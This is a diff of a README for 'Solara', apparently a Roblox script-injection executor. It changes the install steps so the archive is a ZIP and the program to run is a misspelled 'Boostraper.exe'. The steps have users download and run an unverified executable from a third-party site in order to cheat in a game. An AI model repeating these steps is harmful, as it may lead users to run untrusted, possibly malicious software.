@@ -28,9 +28,9 @@ Solara may require periodic updates due to detection. The developers do not clai
 
 1. **Visit the Official Website**: Go to [solara.wiki](https://solara.wiki/).
 2. **Download the Executor**: Scroll to the download section and click on the “Download Solara” button.
-3. **Extract the Files**: After downloading, open the RAR file and extract it to your preferred location.
+3. **Extract the Files**: After downloading, open the ZIP file and extract it to your preferred location.
 4. **Launch Roblox**: Open Roblox using Bloxstrap and join your desired game.
-5. **Run Solara**: Execute “Solara.exe” and start attaching scripts to your Roblox game.
+5. **Run Solara**: Execute “Boostraper.exe” and start attaching scripts to your Roblox game.
 
 </div>
 
